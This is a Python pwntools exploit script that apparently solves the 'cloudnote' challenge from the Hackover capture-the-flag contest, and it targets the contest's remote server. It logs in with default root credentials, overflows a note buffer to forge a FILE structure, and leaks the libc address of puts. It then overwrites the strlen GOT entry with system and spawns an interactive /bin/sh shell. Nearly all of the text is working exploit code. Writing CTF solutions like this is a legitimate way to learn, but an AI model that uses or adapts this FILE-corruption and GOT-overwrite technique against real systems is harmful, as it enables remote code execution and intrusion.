from pwn import *

os.environ['LD_PRELOAD'] = './libc.so.6'
#r = process(['./ld-2.23.so', './cloudnote'])
e = ELF('./cloudnote')
#libc = e.libc
libc = ELF('./libc.so.6')
r = remote('cloud-note.ctf.hackover.de', 6354)
context.log_level = 'debug'

def register(name, password):
	r.sendlineafter('cmd> ', 'register')
	r.sendlineafter('Username: ', name)
	r.sendlineafter('Password: ', password)
def login(name, password):
	r.sendlineafter('cmd> ', 'login')
	r.sendlineafter('Username: ', name)
	r.sendlineafter('Password: ', password)
def logout():
	r.sendlineafter('cmd> ', 'logout')
def note_add(content):
	r.sendlineafter('cmd> ', 'note add')
	r.sendlineafter('note> ', content)

script = "b fseek"
#gdb.attach(r)
login('root', 'root')
raw_input('>>')
logout()
puts = e.got['puts']

#0xfbad2c84 write flag
note_add('\0'*8+'A'*280+p64(0xfbad2c84)+p64(puts)+p64(puts)+p64(puts)+p64(puts)+p64(puts+8)+p64(puts+8)+p64(puts)+p64(puts+8)+p64(0)*5+p64(1)+'\0'*16+p64(0x602110+8))
puts = u64(r.recv(8))
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
log.info('libc_base: %#x' % libc_base)

puts = e.got['strlen']
note_add(p64(system)+'A'*280+p64(0xfbad2480)+p64(puts)+p64(puts+8)+p64(puts)+p64(puts)+p64(puts)+p64(puts+8)+p64(puts)+p64(puts+8)+p64(0)*5+p64(1)+'\0'*16+p64(0x602110+8))

r.sendline('/bin/sh')
r.sendline('id')

r.interactive()
